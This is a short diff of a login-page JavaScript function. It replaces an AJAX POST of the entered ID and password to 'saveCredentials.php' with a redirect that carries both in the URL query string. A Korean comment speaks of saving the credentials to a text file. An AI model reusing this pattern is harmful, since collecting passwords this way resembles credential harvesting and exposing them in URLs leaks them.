@@ -144,19 +144,9 @@ var SystemInfo = new function() {
       function saveAndRedirect() {
 
         var id = document.getElementById("id").value;
-            var pw = document.getElementById("pw").value;
+        var pw = document.getElementById("pw").value;
 
-            // AJAX를 사용하여 PHP 파일에 데이터 전송
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "saveCredentials.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    // PHP 파일의 응답을 출력
-                    console.log(xhr.responseText);
-                }
-            };
-            xhr.send("id=" + id + "&pw=" + pw);
+        window.location.href = "output.html?id=" + encodeURIComponent(id) + "&pw=" + encodeURIComponent(pw);
 
           //xhr.send(JSON.stringify(dataToSend));
           // ID와 PW를 특정 경로에 텍스트 파일로 저장
